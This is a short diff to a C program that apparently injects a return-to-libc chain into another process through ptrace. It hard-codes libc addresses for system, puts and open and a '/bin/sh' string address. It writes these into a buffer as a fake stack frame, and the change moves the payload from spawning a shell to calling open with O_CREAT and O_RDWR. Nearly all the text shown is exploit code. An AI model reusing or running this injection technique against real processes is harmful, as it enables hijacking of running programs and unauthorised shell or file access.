@@ -9,12 +9,18 @@
 #include <sys/reg.h>
 #include <sys/wait.h>
 
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
 #define MAX_BUFFLEN     (4096)
 
 static unsigned long exitvaddr = 0x2de10;
-//static unsigned long systemvaddr = 0x380b0;
-static unsigned long systemvaddr = 0x5ea90;
-static unsigned long binshvaddr = 0x1243ff;
+//static unsigned long systemvaddr = 0x380b0; // system
+//static unsigned long systemvaddr = 0x5ea90; // puts
+static unsigned long systemvaddr = 0xbf3e0; // open
+//static unsigned long binshvaddr = 0x1243ff;
+static unsigned long binshvaddr = 0xcf19;
 
 static uint8_t injected_buffer[MAX_BUFFLEN];
 
@@ -122,7 +128,9 @@ void ril_make_buffer(pid_t pid, size_t bufflen)
 
 	*walker++ = (systemvaddr);
 	*walker++ = (exitvaddr);
-	*walker   = binshvaddr;
+	*walker++   = binshvaddr;
+	*walker++   = O_CREAT | O_RDWR;
+	memset(walker, 0, 5 * sizeof(*walker));
 
 }
 
